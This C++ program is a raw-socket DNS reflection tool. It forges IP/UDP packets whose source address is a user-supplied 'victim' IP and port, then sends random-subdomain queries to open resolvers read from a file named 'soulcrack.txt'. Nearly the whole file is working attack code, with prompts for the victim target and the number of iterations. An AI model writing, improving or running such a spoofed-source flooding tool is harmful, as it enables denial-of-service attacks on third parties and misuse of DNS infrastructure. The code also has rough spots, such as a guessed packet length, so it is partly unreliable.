#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <thread>
#include <array>
#include <cstdint>
#include <cstring>       // For memcpy
#include <sys/socket.h>  // For raw sockets
#include <netinet/ip.h>  // For iphdr
#include <netinet/udp.h> // For udphdr
#include <arpa/inet.h>   // For inet_pton
#include <unistd.h>      // For close

// DNSQuery struct and helpers (same as before)
struct DNSQuery {
    std::string type;
    std::string hostname;
    uint16_t queryId;
};

std::vector<std::string> loadFromFile(const std::string& filename) {
    std::vector<std::string> servers;
    std::ifstream file(filename);
    if (!file.is_open()) {
        std::cerr << "Error: Could not open " << filename << std::endl;
        return servers;
    }
    std::string line;
    while (std::getline(file, line)) {
        if (!line.empty() && line[0] != '#') servers.push_back(line);
    }
    return servers;
}

std::string randomString(size_t length) {
    static const std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, chars.size() - 1);
    std::string str;
    for (size_t i = 0; i < length; ++i) {
        str += chars[dis(gen)];
    }
    return str;
}

std::string pickRandom(const std::vector<std::string>& items) {
    if (items.empty()) return "";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, items.size() - 1);
    return items[dis(gen)];
}

// Checksum calculator for IP/UDP
uint16_t checksum(const uint16_t* buf, int len) {
    uint32_t sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) sum += *(uint8_t*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

// Encode full raw packet: IP + UDP + DNS
std::array<uint8_t, 1024> encodeFullPacket(const DNSQuery& query, const std::string& srcIP, uint16_t srcPort, const std::string& dstIP, uint16_t dstPort) {
    std::array<uint8_t, 1024> packet{};
    size_t pos = 0;

    // Build DNS payload first
    std::array<uint8_t, 512> dnsBuffer{};
    size_t dnsPos = 0;
    dnsBuffer[dnsPos++] = (query.queryId >> 8) & 0xFF;
    dnsBuffer[dnsPos++] = query.queryId & 0xFF;
    dnsBuffer[dnsPos++] = 0x01;  // Flags
    dnsBuffer[dnsPos++] = 0x00;
    dnsBuffer[dnsPos++] = 0x00;  // QDCOUNT
    dnsBuffer[dnsPos++] = 0x01;
    dnsBuffer[dnsPos++] = 0x00;  // ANCOUNT
    dnsBuffer[dnsPos++] = 0x00;
    dnsBuffer[dnsPos++] = 0x00;  // NSCOUNT
    dnsBuffer[dnsPos++] = 0x00;
    dnsBuffer[dnsPos++] = 0x00;  // ARCOUNT
    dnsBuffer[dnsPos++] = 0x00;

    std::string hostname = query.hostname;
    size_t dot_pos;
    while ((dot_pos = hostname.find('.')) != std::string::npos) {
        dnsBuffer[dnsPos++] = static_cast<uint8_t>(dot_pos);
        for (size_t i = 0; i < dot_pos; ++i) {
            dnsBuffer[dnsPos++] = static_cast<uint8_t>(hostname[i]);
        }
        hostname = hostname.substr(dot_pos + 1);
    }
    dnsBuffer[dnsPos++] = static_cast<uint8_t>(hostname.size());
    for (char c : hostname) {
        dnsBuffer[dnsPos++] = static_cast<uint8_t>(c);
    }
    dnsBuffer[dnsPos++] = 0x00;  // End QNAME
    dnsBuffer[dnsPos++] = 0x00;  // QTYPE A
    dnsBuffer[dnsPos++] = 0x01;
    dnsBuffer[dnsPos++] = 0x00;  // QCLASS IN
    dnsBuffer[dnsPos++] = 0x01;
    size_t dnsLen = dnsPos;

    // IP header
    struct iphdr *iph = (struct iphdr *)(packet.data() + pos);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dnsLen;
    iph->id = htons(54321);  // Random ID
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    inet_pton(AF_INET, srcIP.c_str(), &(iph->saddr));  // Spoofed source
    inet_pton(AF_INET, dstIP.c_str(), &(iph->daddr));
    pos += sizeof(struct iphdr);

    // UDP header
    struct udphdr *udph = (struct udphdr *)(packet.data() + pos);
    udph->source = htons(srcPort);
    udph->dest = htons(dstPort);
    udph->len = htons(sizeof(struct udphdr) + dnsLen);
    udph->check = 0;
    pos += sizeof(struct udphdr);

    // Copy DNS payload
    memcpy(packet.data() + pos, dnsBuffer.data(), dnsLen);
    pos += dnsLen;

    // Checksums
    iph->check = checksum((uint16_t*)iph, sizeof(struct iphdr));

    struct {
        uint32_t src_addr;
        uint32_t dst_addr;
        uint8_t placeholder;
        uint8_t protocol;
        uint16_t udp_len;
    } pseudo_hdr;
    pseudo_hdr.src_addr = iph->saddr;
    pseudo_hdr.dst_addr = iph->daddr;
    pseudo_hdr.placeholder = 0;
    pseudo_hdr.protocol = IPPROTO_UDP;
    pseudo_hdr.udp_len = udph->len;
    std::array<uint8_t, 1024> checkBuf{};
    memcpy(checkBuf.data(), &pseudo_hdr, sizeof(pseudo_hdr));
    memcpy(checkBuf.data() + sizeof(pseudo_hdr), udph, sizeof(struct udphdr) + dnsLen);
    udph->check = checksum((uint16_t*)checkBuf.data(), sizeof(pseudo_hdr) + sizeof(struct udphdr) + dnsLen);

    return packet;
}

bool sendRawPacket(const std::array<uint8_t, 1024>& packet, size_t packet_size, const std::string& dstIP) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        std::cerr << "Error creating raw socket. Run as root?" << std::endl;
        return false;
    }

    // Enable IP_HDRINCL to include our IP header
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        std::cerr << "Error setting IP_HDRINCL." << std::endl;
        close(sock);
        return false;
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    inet_pton(AF_INET, dstIP.c_str(), &(sin.sin_addr));

    if (sendto(sock, packet.data(), packet_size, 0, (struct sockaddr*)&sin, sizeof(sin)) < 0) {
        std::cerr << "Send failed." << std::endl;
        close(sock);
        return false;
    }

    std::cout << "Sent full raw packet of " << packet_size << " bytes to " << dstIP << std::endl;
    close(sock);
    return true;
}

int main() {
    // Configs with defaults
    std::string dnsFile = "soulcrack.txt";
    std::string baseDomain = "google.com";
    std::string victimIP = "127.0.0.1";  // Default spoofed source IP
    uint16_t victimPort = 23837;         // Default spoofed source port
    uint16_t dnsPort = 53;               // DNS server port
    size_t labelLength = 10;
    size_t maxIterations = 10;           // Default iterations
    std::chrono::milliseconds delay(500);

    // Prompt for runtime input
    std::string input;
    std::cout << "Enter victim IP (default: 127.0.0.1): ";
    std::getline(std::cin, input);
    if (!input.empty()) {
        victimIP = input;
    }

    std::cout << "Enter victim port (default: 23837): ";
    std::getline(std::cin, input);
    if (!input.empty()) {
        try {
            victimPort = static_cast<uint16_t>(std::stoi(input));
        } catch (const std::exception& e) {
            std::cerr << "Invalid port; using default. Error: " << e.what() << std::endl;
        }
    }

    std::cout << "Enter number of iterations (default: 10): ";
    std::getline(std::cin, input);
    if (!input.empty()) {
        try {
            maxIterations = static_cast<size_t>(std::stoi(input));
        } catch (const std::exception& e) {
            std::cerr << "Invalid number; using default. Error: " << e.what() << std::endl;
        }
    }

    std::cout << "Using victim IP: " << victimIP << ", Port: " << victimPort << ", Iterations: " << maxIterations << std::endl;

    auto dnsServers = loadFromFile(dnsFile);
    if (dnsServers.empty()) {
        std::cerr << "No DNS servers loaded." << std::endl;
        return 1;
    }

    std::random_device rd;
    std::mt19937 gen(rd());

    size_t i = 0;
    while (i < maxIterations) {
        std::string randomLabel = randomString(labelLength);
        std::string targetDomain = randomLabel + "." + baseDomain;

        DNSQuery query;
        query.type = "A";
        query.hostname = targetDomain;
        query.queryId = std::uniform_int_distribution<uint16_t>(0, 65535)(gen);

        std::string destIP = pickRandom(dnsServers);
        if (destIP.empty()) continue;

        auto fullPacket = encodeFullPacket(query, victimIP, victimPort, destIP, dnsPort);
        size_t packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + 50;  // Adjust if needed (rough estimate)

        if (!sendRawPacket(fullPacket, packet_size, destIP)) {
            std::cerr << "Failed to send packet " << i << std::endl;
            continue;
        }

        std::this_thread::sleep_for(delay);
        ++i;
    }

    std::cout << "Completed " << maxIterations << " test iterations." << std::endl;
    return 0;
}
